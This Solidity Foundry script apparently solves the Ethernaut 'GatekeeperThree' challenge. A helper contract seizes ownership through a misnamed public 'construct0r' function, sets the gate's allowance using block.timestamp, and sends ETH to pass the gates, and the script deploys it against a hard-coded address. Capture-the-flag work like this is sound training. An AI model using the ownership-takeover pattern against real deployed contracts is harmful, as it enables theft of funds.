// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";

interface GatekeeperThree {
    // Getters
    function owner() external returns (address);
    function entrant() external returns (address);
    function allowEntrance() external returns (bool);
    function trick() external returns (address);

    function construct0r() external;
    function createTrick() external;
    function getAllowance(uint256) external;
    function enter() external;
}

interface SimpleTrick {
    // Getters
    function target() external returns (address);
    function trick() external returns (address);
}

contract GateThreeKey {
    GatekeeperThree gate;
    error SendingETHFailed();

    constructor(address gateAddress) payable {
        gate = GatekeeperThree(gateAddress);

        // Become owner (gate 1)
        gate.construct0r();

        // Create trick
        gate.createTrick();

        // Allow entrance (gate 2)
        gate.getAllowance(block.timestamp);

        // Send ETH (gate 3)
        (bool success,) = address(gate).call{value: msg.value}("");
        if (!success) {
            revert SendingETHFailed();
        }
    }

    // We separate the "enter()" function because if "gate" tries to send
    // ETH to GateThreeKey during deployment (its code is not on-chain before constructor is finished)
    // it won't revert.
    function enterGate() external {
        // Enter gate
        gate.enter();
    }
}

contract AttackGateThree is Script {
    address public gateAddress = 0xd368e515FED3AaF96762361172da327961a6F0b8;
    
    function run() public {
        vm.startBroadcast();

        GateThreeKey key = new GateThreeKey{value: 0.0011 ether}(gateAddress);
        key.enterGate();

        vm.stopBroadcast();

        // Check information
        console.log("GateThreeKey deployed at:", address(key));
        uint256 keyBalance = address(key).balance;
        console.log("GateThreeKey balance: ", keyBalance);

        GatekeeperThree gate = GatekeeperThree(gateAddress);
        console.log("GatekeeperThree is deployed at: ", address(gate));
        console.log("GatekeeperThree storage");
        address owner = gate.owner();
        address entrant = gate.entrant();
        bool allowEntrance = gate.allowEntrance();
        uint256 gateBalance = address(gate).balance;
        console.log("Owner is: ", owner);
        console.log("Entrant is: ", entrant);
        console.log("Allow entrance is: ", allowEntrance);
        console.log("GatekeeperThree balance: ", gateBalance);

        SimpleTrick trick = SimpleTrick(gate.trick());
        console.log("SimpleTrick is deployed at: ", address(trick));
        console.log("SimpleTrick storage");
        address target = trick.target();
        address trick_trick = trick.trick();
        console.log("Target is: ", target);
        console.log("Trick is: ", trick_trick); 
    }
}


/*
PAPA
TITA
MAEL

*/